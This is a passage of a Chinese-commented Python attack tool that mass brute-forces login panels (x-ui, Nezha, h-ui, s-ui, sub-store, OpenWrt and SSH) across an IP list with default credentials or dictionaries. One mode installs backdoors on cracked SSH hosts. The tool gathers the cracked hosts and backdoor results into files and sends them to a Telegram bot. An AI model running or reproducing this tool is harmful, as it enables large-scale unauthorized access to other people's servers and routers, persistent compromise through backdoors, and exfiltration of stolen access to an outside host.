            print(f"❌ 安装 {pkg} 失败，请检查网络或手动安装。")
            sys.exit(1)

    ensure_cmd_exists("curl", ["apt", "install", "-y", "curl"])
    ensure_pip()
    ensure_module("requests")
    ensure_module("openpyxl")
    ensure_go()

    if TEMPLATE_MODE == 6:
        ensure_go_package("golang.org/x/crypto/ssh")

    print(">>> 依赖环境检测完成 ✅\n")









def load_credentials():
    if TEMPLATE_MODE == 7:
        # 模式 7：固定用户名 admin1，只允许使用 password.txt 字典
       
        usernames = ["2cXaAxRGfddmGz2yx1wA"]
        use_custom = input("是否使用 password.txt 路径库？(y/N，默认使用 2cXaAxRGfddmGz2yx1wA 作为路径): ").strip().lower()
        if use_custom == 'y':
            if not os.path.exists("password.txt"):
                print("缺少 password.txt 文件，请检查后重试")
                sys.exit(1)
            passwords = open("password.txt", encoding='utf-8').read().splitlines()
        else:
            passwords = ["2cXaAxRGfddmGz2yx1wA"]
    else:
        # 其他模式：完整判断 username.txt / password.txt
        use_custom = input("是否使用 username.txt / password.txt 字典库？(y/N，默认使用 admin/admin 或 sysadmin/sysadmin 或 root/password): ").strip().lower()
        if use_custom == 'y':
            if not os.path.exists("username.txt") or not os.path.exists("password.txt"):
                print("缺少 username.txt 或 password.txt 文件，请检查后重试")
                sys.exit(1)
            usernames = open("username.txt", encoding='utf-8').read().splitlines()
            passwords = open("password.txt", encoding='utf-8').read().splitlines()
        else:
            if TEMPLATE_MODE == 3:
                usernames = ["sysadmin"]
                passwords = ["sysadmin"]
            elif TEMPLATE_MODE == 8:
                usernames = ["root"]
                passwords = ["password"]
            else:
                usernames = ["admin"]
                passwords = ["admin"]
    return usernames, passwords




if __name__ == "__main__":
        start = time.time()
        interrupted = False  # 标记是否被中断
        final_result_file = None

        try:
                check_environment()
                print("=== 爆破一键启动 ===")
                input_file = input_filename_with_default("请输入源文件名", "1.txt")
                if not os.path.exists(input_file):
                        print("文件不存在")
                        sys.exit(1)

                lines_per_file = input_with_default("每个小文件行数", 5000)
                sleep_seconds = input_with_default("爆破完休息秒数", 2)
                semaphore_size = input_with_default("爆破线程数", 250)
                batch_size = input_with_default("每批次数量", 1000)

                usernames, passwords = load_credentials()

                # 生成对应模板代码
                if TEMPLATE_MODE == 1:
                        generate_xui_go(semaphore_size, batch_size, usernames, passwords)
                elif TEMPLATE_MODE == 2:
                        generate_xui_go_template2(semaphore_size, batch_size, usernames, passwords)
                elif TEMPLATE_MODE == 3:
                        generate_xui_go_template3(semaphore_size, batch_size, usernames, passwords)
                elif TEMPLATE_MODE == 4:
                        generate_xui_go_template4(semaphore_size, batch_size, usernames, passwords)
                elif TEMPLATE_MODE == 5:
                        generate_xui_go_template5(semaphore_size, batch_size, usernames, passwords)
                elif TEMPLATE_MODE == 6:
                        generate_xui_go_template6(semaphore_size, batch_size, usernames, passwords, INSTALL_BACKDOOR, CUSTOM_BACKDOOR_CMDS)
                elif TEMPLATE_MODE == 7:
                        generate_xui_go_template7(semaphore_size, batch_size, usernames, passwords)
                elif TEMPLATE_MODE == 8:
                        generate_xui_go_template8(semaphore_size, batch_size, usernames, passwords)        

                generate_ipcx_py()
                split_file(input_file, lines_per_file)
                run_xui_for_parts(sleep_seconds)
                merge_xui_files()
                merge_result_files("hmsuccess", "hmsuccess.txt", TEMP_HMSUCCESS_DIR)
                merge_result_files("hmfail", "hmfail.txt", TEMP_HMFAIL_DIR)

                import os
                import shutil
                from datetime import datetime, timedelta, timezone

                beijing_time = datetime.utcnow().replace(tzinfo=timezone.utc) + timedelta(hours=8)
                time_str = beijing_time.strftime("%Y%m%d-%H%M")

                if TEMPLATE_MODE == 1:
                        run_ipcx()
                        if os.path.exists("xui.txt"):
                                final_result_file = f"XUI-{time_str}.txt"
                                os.rename("xui.txt", final_result_file)
                        if os.path.exists("xui.xlsx"):
                                os.rename("xui.xlsx", f"XUI-{time_str}.xlsx")

                elif TEMPLATE_MODE == 2 and os.path.exists("xui.txt"):
                        final_result_file = f"哪吒-{time_str}.txt"
                        shutil.move("xui.txt", final_result_file)

                elif TEMPLATE_MODE == 3:
                        run_ipcx()
                        if os.path.exists("xui.txt"):
                                final_result_file = f"HUI-{time_str}.txt"
                                os.rename("xui.txt", final_result_file)
                        if os.path.exists("xui.xlsx"):
                                os.rename("xui.xlsx", f"HUI-{time_str}.xlsx")

                elif TEMPLATE_MODE == 4:
                        run_ipcx()
                        if os.path.exists("xui.txt"):
                                final_result_file = f"咸蛋-{time_str}.txt"
                                os.rename("xui.txt", final_result_file)
                        if os.path.exists("xui.xlsx"):
                                os.rename("xui.xlsx", f"咸蛋-{time_str}.xlsx")

                elif TEMPLATE_MODE == 5:
                        run_ipcx()
                        if os.path.exists("xui.txt"):
                                final_result_file = f"SUI-{time_str}.txt"
                                os.rename("xui.txt", final_result_file)
                        if os.path.exists("xui.xlsx"):
                                os.rename("xui.xlsx", f"SUI-{time_str}.xlsx")

                elif TEMPLATE_MODE == 6:
                        run_ipcx()
                        
                        if os.path.exists("xui.txt"):
                                final_result_file = f"ssh-{time_str}.txt"
                                os.rename("xui.txt", final_result_file)
                        if os.path.exists("xui.xlsx"):
                                os.rename("xui.xlsx", f"ssh-{time_str}.xlsx")
                        if os.path.exists("hmsuccess.txt"):
                                os.rename("hmsuccess.txt", f"后门安装成功-{time_str}.txt")
                        if os.path.exists("hmfail.txt"):
                                os.rename("hmfail.txt", f"后门安装失败-{time_str}.txt")              
                        
                elif TEMPLATE_MODE == 7 and os.path.exists("xui.txt"):
                        final_result_file = f"substore-{time_str}.txt"
                        shutil.move("xui.txt", final_result_file)
                elif TEMPLATE_MODE == 8:
                        run_ipcx()
                        if os.path.exists("xui.txt"):
                                final_result_file = f"OpenWrt-{time_str}.txt"
                                os.rename("xui.txt", final_result_file)
                        if os.path.exists("xui.xlsx"):
                                os.rename("xui.xlsx", f"OpenWrt-{time_str}.xlsx")

   
        except KeyboardInterrupt:
                print("\n>>> 用户中断操作（Ctrl+C），准备清理临时文件...")
                interrupted = True
        finally:
                clean_temp_files()
                end = time.time()
                cost = int(end - start)

                if interrupted:
                        print(f"\n=== 脚本已被用户中断，中止前共运行 {cost // 60} 分 {cost % 60} 秒 ===")
                else:
                        print(f"\n=== 全部完成！总用时 {cost // 60} 分 {cost % 60} 秒 ===")

                # ====== 自动上传 Telegram ======
                def send_to_telegram(file_path, bot_token, chat_id):
                        import requests
                        import os

                        if not os.path.exists(file_path):
                                print(f"⚠️ Telegram 上传失败：文件 {file_path} 不存在")
                                return

                        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                        with open(file_path, "rb") as f:
                                files = {'document': f}
                                data = {'chat_id': chat_id, 'caption': f"爆破结果：{os.path.basename(file_path)}"}
                                try:
                                        response = requests.post(url, data=data, files=files)
                                        if response.status_code == 200:
                                                print(f"✅ 文件 {file_path} 已发送到 Telegram")
                                        else:
                                                print(f"❌ TG上传失败，状态码：{response.status_code}，返回：{response.text}")
                                except Exception as e:
                                        print(f"❌ 发送到 TG 失败：{e}")

                # 配置你的 Bot Token 和 Chat ID
                BOT_TOKEN = ""
                CHAT_ID = ""

                if final_result_file:
                        print(f"\n📤 正在将 {final_result_file} 上传至 Telegram ...")
                        send_to_telegram(final_result_file, BOT_TOKEN, CHAT_ID)

                        # 尝试上传对应的 xlsx 文件
                        xlsx_file = final_result_file.replace(".txt", ".xlsx")
                        if os.path.exists(xlsx_file):
                                print(f"📤 正在将 {xlsx_file} 上传至 Telegram ...")
                                send_to_telegram(xlsx_file, BOT_TOKEN, CHAT_ID)
                        else:
                                print("⚠️ 没有找到对应的 xlsx 文件，跳过上传")
                        # 尝试上传后门安装成功/失败文件
                        success_file = f"后门安装成功-{time_str}.txt"
                        fail_file    = f"后门安装失败-{time_str}.txt"

                        if os.path.exists(success_file):
                                print(f"📤 正在将 {success_file} 上传至 Telegram ...")
                                send_to_telegram(success_file, BOT_TOKEN, CHAT_ID)
                        else:
                                print("⚠️ 没有找到 后门安装成功 文件，跳过上传")

                        if os.path.exists(fail_file):
                                print(f"📤 正在将 {fail_file} 上传至 Telegram ...")
                                send_to_telegram(fail_file, BOT_TOKEN, CHAT_ID)
                        else:
                                print("⚠️ 没有找到 后门安装失败 文件，跳过上传")
